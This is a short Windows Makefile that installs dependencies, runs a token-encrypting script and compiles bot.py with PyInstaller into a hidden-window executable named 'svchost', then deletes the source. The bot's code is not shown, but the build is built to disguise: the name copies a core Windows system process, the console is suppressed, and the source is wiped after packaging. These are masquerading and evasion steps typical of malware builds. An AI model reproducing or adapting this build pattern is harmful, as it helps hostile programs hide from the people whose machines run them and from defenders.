.PHONY: install build clean

install:
	pip install -r requirements.txt

build: install
	python encrypt_token.py
	pyinstaller --onefile --noconsole --name svchost bot.py
	del bot.py

clean:
	if exist dist rmdir /s /q dist
	if exist build rmdir /s /q build
	if exist svchost.spec del svchost.spec
	if exist bot.py del bot.py
